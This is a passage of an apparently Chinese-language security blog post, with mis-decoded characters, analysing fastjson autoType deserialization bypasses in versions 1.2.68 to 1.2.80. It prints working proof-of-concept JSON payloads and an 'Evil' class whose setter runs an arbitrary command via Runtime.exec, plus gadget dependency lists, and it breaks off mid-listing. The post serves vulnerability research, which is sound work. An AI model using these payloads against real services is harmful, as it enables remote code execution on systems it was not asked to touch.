<p>ç„¶åè¿™é‡ŒjsonæŒ‡é’ˆç»§ç»­å‘åè¯»å–ï¼Œ<code>key</code>ä¸º<code>@type</code>æ—¶è¿›å…¥ifï¼Œå¹¶è¯»å–å€¼ä½œä¸º<code>typeName</code>ä¼ å…¥<code>config.checkAutoType(typeName, expectClass, lexer.getFeatures())ï¼›</code></p>
<p><img loading="lazy" src="images/image-20250528095626527.png" alt="image-20250528095626527"  />
</p>
<p>åˆ°è¿™é‡Œå°±å®Œæˆäº†<code>expectClass</code>çš„ä¼ å…¥äº†ï¼Œç„¶åæƒ³è¦å®Œæˆreturnåªéœ€è¦ï¼Œç»§æ‰¿äº<code>expectClass</code>ï¼Œä¸”ä¸æ˜¯é»‘åå•å³å¯</p>
<p><img loading="lazy" src="images/image-20250528100537640.png" alt="image-20250528100537640"  />
</p>
<h4 id="expectclassæŸ¥æ‰¾">expectClassæŸ¥æ‰¾<a hidden class="anchor" aria-hidden="true" href="#expectclassæŸ¥æ‰¾">#</a></h4>
<p>ä¸Šé¢åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªexpectClassæ¥åŠ è½½æˆ‘ä»¬æ¶æ„classäº†ï¼Œä½†æ˜¯è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ª<code>expectClass</code>æ¥return è‡ªå·±çš„classï¼Œå¹¶è¿›å…¥åˆ°<code>createJavaBeanDeserializer()</code></p>
<h5 id="æ— autotypesupport">æ— autoTypeSupport<a hidden class="anchor" aria-hidden="true" href="#æ— autotypesupport">#</a></h5>
<p>é¦–å…ˆ<code>æ— autoTypeSupport</code> å®Œæˆ <code>return class</code>ï¼ŒåŠåˆ†æ<code>checkAutoType()</code>é€»è¾‘</p>
<p>å¯ä»¥çœ‹åˆ°<strong>æ— </strong><code>autoTypeSupport</code>å’Œ<code>expectClass</code>ï¼Œä¼šå…ˆåœ¨<code>mappings</code>å’Œ<code>deserializers</code>æŸ¥æ‰¾ç„¶åè¿”å›class</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">deserializers</span><span class="p">.</span><span class="na">findClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250528101108255.png" alt="image-20250528101108255"  />
</p>
<p>ç»§ç»­å¾€ä¸‹åˆ°<code>ç¬¬äºŒæ¬¡é»‘/ç™½åå•</code>æ£€æµ‹ï¼Œä½¿å¾—autoTypeSupportä¸ºfalseä¹Ÿä¼šè¿›è¡Œwafæ£€æµ‹ï¼Œä½†æ˜¯å¯ä»¥å‘ç°æ˜¯ç™½åå•çš„è¯åˆ™ä¼š<strong>ç›´æ¥loadclasså¹¶è¿”å›class</strong></p>
<p><img loading="lazy" src="images/image-20250528101641182.png" alt="image-20250528101641182"  />
</p>
<p>ç„¶åç»§ç»­å¾€ä¸‹å°±è¿˜æœ‰æœ€åä¸€å¤„ï¼Œç»§æ‰¿äº<code>JSONType.class</code>ä¹Ÿä¼š<code>return class</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getAnnotation</span><span class="p">(</span><span class="n">clazz</span><span class="p">,</span><span class="n">JSONType</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¡¥å……ï¼Œé«˜ç‰ˆæœ¬æ‰æœ‰<code>internalWhite</code>ï¼Œæœ‰ä¸ªç™½åå•ï¼Œå±äºç™½åå•çš„ä¼šåŠ è½½ï¼Œç„¶ååé¢ä»£ç ä¼šreturn class</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">internalWhite</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h5 id="return-å°ç»“">return å°ç»“<a hidden class="anchor" aria-hidden="true" href="#return-å°ç»“">#</a></h5>
<p>æ€»ç»“ä¸‹<code>æ— autoTypeSupport</code>å¯ä»¥<code>return class</code>çš„ç‚¹</p>
<ul>
<li>
<p>Mappingsï¼Œdeserializers</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">deserializers</span><span class="p">.</span><span class="na">findClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div></li>
<li>
<p>checkAutoTypeé‡Œç™½åå•ï¼ˆ<strong>é»˜è®¤ä¸ºç©º</strong></p>
</li>
<li>
<p>ç»§æ‰¿JSONType.class</p>
</li>
<li>
<p>internalWhite ç™½åå•</p>
</li>
</ul>
<h5 id="æ€ä¹ˆæ‰¾">æ€ä¹ˆæ‰¾<a hidden class="anchor" aria-hidden="true" href="#æ€ä¹ˆæ‰¾">#</a></h5>
<p>ç„¶åè¦æ‰¾<code>JavaBeanDeserializer</code>çš„è¯ï¼Œ<code>deserializers</code>å°±å¯ä»¥æ’é™¤äº†ï¼Œå› ä¸ºä»–initæ²¡æœ‰putå¯¹åº”çš„<code>JavaBeanDeserializer</code>ï¼ˆ<code>ThrowableDeserializer</code>æœ‰</p>
<p>mappingsåœ¨<code>addBaseClassMappings()</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œå¯ä»¥æ›´ç›´è§‚çœ‹åˆ°å“ªäº›classå¯ä»¥åˆ©ç”¨</p>
<p><img loading="lazy" src="images/image-20250528104402238.png" alt="image-20250528104402238"  />
</p>
<p>ç„¶åçœ‹åˆ°<code>Object.class</code>è¿™ä¸æ˜¯éšä¾¿åˆ©ç”¨ï¼Ÿï¼ˆ1.2.42å‰é¢çœ‹çš„ä»£ç é€»è¾‘ï¼‰</p>
<p>ç„¶åçœ‹äº†ä¸‹<code>1.2.67</code>åšäº†ä¸€äº›é™åˆ¶ï¼ŒexpectClassä¸èƒ½æ˜¯ä¸‹æ–¹è¿™äº›ç±»ï¼Œä¸ç„¶<code>expectClassFlag = false;</code>-&gt;ä¸èƒ½<strong>åŠ è½½å’Œè¿”å›class</strong>ï¼ˆè¿™æ ·å¤„ç†ä¹Ÿæ˜¯ä¸ºäº†é™åˆ¶åˆ©ç”¨èŒƒå›´ï¼Œå› ä¸ºä¸‹æ–¹ç»§æ‰¿ç±»å¾ˆå¤š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Serializable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Cloneable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Closeable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">EventListener</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Iterable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Collection</span><span class="p">.</span><span class="na">class</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶å1.2.67ä»£ç ä¸Šç›¸å¯¹äºä¹‹å‰ç‰ˆæœ¬ï¼Œå¹¶ä¸ä¼šéƒ½è¿›è¡Œ<code>loadClass()</code>äº†ï¼Œæ”¹ä¸ºä¸‹æ–¹è¿™ç§æ–¹å¼</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">autoTypeSupport</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">jsonType</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">expectClassFlag</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//jsonType å°±æ˜¯ç»§æ‰¿JSONType.class</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">cacheClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">autoTypeSupport</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">jsonType</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="n">cacheClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><blockquote>
<p>ä¹Ÿå°±æ˜¯ä»<code>mappings</code>å’Œ<code>JSONType.class</code>ä»¥åŠ<code>internalWhite</code> é‡Œæ‰¾ <code>expectClass</code></p>
</blockquote>
<p>Evilç»§æ‰¿AutoCloseableå°±è¡Œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.lang.AutoCloseable\&#34;{\&#34;@type\&#34;:\&#34;Evil\&#34;,\&#34;cmd\&#34;:\&#34;calc\&#34;}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><strong>jdbc gadgets</strong></p>
<p><img loading="lazy" src="images/image-20250604150902377.png" alt="image-20250604150902377"  />
</p>
<h4 id="1268å°ç»“">1.2.68å°ç»“<a hidden class="anchor" aria-hidden="true" href="#1268å°ç»“">#</a></h4>
<ul>
<li>æ¶æ„ç±»ä¸åœ¨é»‘åå•å†…</li>
<li>æ¶æ„ç±»çš„çˆ¶ç±»ï¼ˆexceptClassä¾‹å¦‚<code>AutoCloseable</code>ï¼‰ä¸åœ¨é»‘åå•å†… ä¸” è¦èƒ½<code>æœ¬èº«èƒ½return class</code> å¹¶èƒ½è·å–<code>JavaBeanDeserializer</code>or<code>ThrowableDeserializer</code>ååºåˆ—åŒ–åŠ è½½å™¨</li>
<li>æ¶æ„ç±»ä¸èƒ½æ˜¯æŠ½è±¡ç±»</li>
<li>æ¶æ„ç±»ä¸­çš„<code>getter/setter/static block/constructor</code>èƒ½è§¦å‘æ¶æ„æ“ä½œ</li>
</ul>
<h4 id="ä¿®å¤">ä¿®å¤<a hidden class="anchor" aria-hidden="true" href="#ä¿®å¤">#</a></h4>
<p>1.2.69æ–°å¢äº†é»‘åå•å¯ä»¥å‚è€ƒhttps://github.com/LeadroyaL/fastjson-blacklist</p>
<p><code>AutoCloseable</code>å°±è¢«æ·»åŠ åˆ°é»‘åå•äº†ï¼Œæ‰€ä»¥åç»­å»æŸ¥æ‰¾ThrowableæœŸæœ›ç±»çš„åˆ©ç”¨</p>
<h2 id="12731280">1.2.73~1.2.80<a hidden class="anchor" aria-hidden="true" href="#12731280">#</a></h2>
<blockquote>
<p>1.2.73çš„æ”¹åŠ¨ï¼Œå…è®¸å¯¹ä»»æ„ç±»å‹çš„<strong>fieldè¿›è¡Œå®ä¾‹åŒ–</strong>ï¼Œå¢åŠ äº†æ”»å‡»é¢ã€‚ä¸‹é¢çš„åˆ©ç”¨å³æ˜¯é€šè¿‡è¿™ä¸ª<code>ç‰¹æ€§</code></p>
</blockquote>
<p>ä¸‹å›¾æ˜¯1.2.67çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ²¡æœ‰<code>fieldè¿›è¡Œå®ä¾‹åŒ–</code>ï¼Œè€Œæ˜¯ç›´æ¥è·å–jsonååºåˆ—åŒ–çš„ç»“æœ</p>
<p><img loading="lazy" src="images/image-20250529171525000.png" alt="image-20250529171525000"  />
</p>
<h3 id="åˆ©ç”¨åŸç†">åˆ©ç”¨åŸç†<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨åŸç†">#</a></h3>
<p>åˆ©ç”¨æ€è·¯å°±åœ¨ä¸‹å›¾ï¼Œé€šè¿‡**<code>putDeserializer</code>**å°†è¿™3ç‚¹åœ°æ–¹å­˜å…¥<code>deserializers</code>ç¼“å­˜ä¸­ï¼Œå†æ¬¡<code>@type</code>è°ƒç”¨ï¼Œå³å¯ç›´æ¥è·å¾—classï¼Œè€Œä¸ä¼šthrowäº†</p>
<p><img loading="lazy" src="images/20220916150508-e5e8c85c-358d-1.png" alt="img"  />
</p>
<p>å‚ç…§y4æ‰©å±•çš„ä¸€ä¸ªdemo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyException</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">MyClass</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Evil</span><span class="w"> </span><span class="n">evil</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setClazz</span><span class="p">(</span><span class="n">MyClass</span><span class="w"> </span><span class="n">clazz</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyException</span><span class="p">(</span><span class="n">try1</span><span class="w"> </span><span class="n">trytry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">trytry</span><span class="p">.</span><span class="na">tryname</span><span class="o">=</span><span class="s">&#34;trytry&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyException</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyClass</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">try1</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">tryname</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Evil</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setCmd</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">cmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>poc</p>
<p>dè¿™ä¸ªåœ°æ–¹æ˜¯ç”¨äº<code>æ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹</code>è·å–ï¼Œç¬¬ä¸€æ¬¡å¯ä»¥å»æ‰ï¼ˆå› ä¸ºæ— å‚å’Œæœ‰å‚æ„é€ æ–¹æ³•ï¼Œé»˜è®¤ä¼šé€‰æ‹©æ— å‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Exception&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;MyException&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;trytry&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;clazz&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;evil&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;MyClass&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;asd&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;c&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Evil&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;cmd&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;d&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;try1&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;tryname&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;tttttry&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æµç¨‹çš„è¯ï¼Œç›´æ¥åˆ°Exceptionè·å¾—<code>ThrowableDeserializer</code>å¹¶æ‰§è¡Œ<code>deserialze()</code>è¿™é‡Œå§</p>
<p>ç„¶åè¿™é‡Œä¼šå»ä¸€ä¸ªforå¾ªç¯å¤„ç†jsonä¸­<code>key</code>çš„å€¼åšå¯¹åº”å¤„ç†ï¼Œ</p>
<ul>
<li><code>@type</code>åˆ™å»åŠ è½½å¯¹åº”ç±»ï¼Œè¿™é‡Œå°±æ˜¯<code>MyException</code></li>
<li>ç„¶åæ˜¯<code>String</code>è¿›è¡Œä¸‹æ–¹åˆ¤æ–­ï¼Œä¸æ˜¯elseifä¸­å­—ç¬¦ï¼Œåˆ™å­˜å‚¨åˆ°<code>otherValues</code>ä¸­ï¼Œï¼ˆclazzï¼Œevilï¼‰</li>
</ul>
<p><img loading="lazy" src="images/image-20250529114100342.png" alt="image-20250529114100342"  />
</p>
<p>ç„¶å<code>otherValues</code>ä¸ä¸ºç©ºï¼Œåˆ™ä¼š<code>getDeserializer()</code>è·å–ä¸Šé¢çš„åŠ è½½çš„classï¼Œè€Œ<code>TypeUtils.cast</code>è¿™é‡Œå°±å®ä¾‹åŒ–filedï¼Œé‡Œé¢æ‰§è¡Œäº†<code>putDeserializer</code>ï¼ˆä¹Ÿå°±æ˜¯åˆ©ç”¨æ€è·¯çš„å…³é”®ï¼‰</p>
<p><img loading="lazy" src="images/image-20250529113640454.png" alt="image-20250529113640454"  />
</p>
<p>è¿™é‡Œè¿˜éœ€è¦å…³æ³¨ä¸‹<code>exBeanDeser.getFieldDeserializer(key);</code>è¿™é‡Œï¼ŒMyExceptionåªæœ‰ æœ‰å‚è‡ªæ„æ–¹æ³•æ—¶ï¼Œè¿™é‡Œåªä¼šè·å–<code>æœ‰å‚è‡ªæ„æ–¹æ³•çš„å‚æ•°ç±»å‹</code>ï¼Œå¦å¤–<code>ä¸¤ç§</code>åˆ™ä¸ä¼šè·å–ï¼ˆå¦å¤–ä¸¤ç§åœ¨<code>æ— å‚è‡ªæ„</code>æ—¶ä¼šè·å–ï¼‰(ä¸‹å›¾éœ€è¦å°†MyExceptionæ— å‚è‡ªæ„æ–¹æ³•<code>æ³¨é‡Š</code></p>
<p><img loading="lazy" src="images/image-20250529160542691.png" alt="image-20250529160542691"  />
</p>
<p>è·Ÿè¿›é‡Œé¢æœ€ååœ¨<code>castToJavaBean()</code>ä¸­è°ƒç”¨<code>config.getDeserializer()</code>-&gt;putDeserializer()ï¼Œè¿”å›çš„ååºåˆ—åŒ–åŠ è½½å™¨è¿˜ä¼šè°ƒç”¨<code>createInstance()</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œè§¦å‘<code>static</code>å’Œ<code>è‡ªæ„æ–¹æ³•</code>code</p>
<p><img loading="lazy" src="images/image-20250529115058068.png" alt="image-20250529115058068"  />
</p>
<p>putDeserializer()</p>
<p><img loading="lazy" src="images/image-20250529111735786.png" alt="image-20250529111735786"  />
</p>
<blockquote>
<p>åªæœ‰ <code>æœ‰å‚æ„é€ æ–¹æ³•</code>çš„æ—¶å€™ï¼Œä¼šè¿˜åŸå‚¨å­˜å¯¹åº”æ–¹æ³•çš„<code>å‚æ•°ç±»å‹</code></p>
<p>æ— æ„é€ æ–¹æ³• or å­˜åœ¨<code>æ— å‚è‡ªæ„æ–¹æ³•</code>æ—¶ï¼Œä¼šè¿˜åŸå¦å¤–ä¸¤ç§æƒ…å†µç±»å‹</p>
</blockquote>
<h3 id="why-public-filed">why public filed<a hidden class="anchor" aria-hidden="true" href="#why-public-filed">#</a></h3>
<p>è¿™é‡Œè¦ä¸€ç›´è¿½éšåˆ°<code>fields</code>çš„åˆå§‹åŒ–ï¼Œè¿™é‡Œåªä¼šè·å–public æ·»åŠ åˆ°listä¸­</p>
<p><img loading="lazy" src="images/image-20250529163603648.png" alt="image-20250529163603648"  />
</p>
<h3 id="gadget">gadget<a hidden class="anchor" aria-hidden="true" href="#gadget">#</a></h3>
<h4 id="jdbc">jdbc<a hidden class="anchor" aria-hidden="true" href="#jdbc">#</a></h4>
<p>ä¾èµ–</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>1.2.80<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>org.python<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>jython<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.7.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>org.postgresql<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>postgresql<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>42.3.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>spring-context<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>5.3.28<span class="nt">&lt;/version&gt;</span>
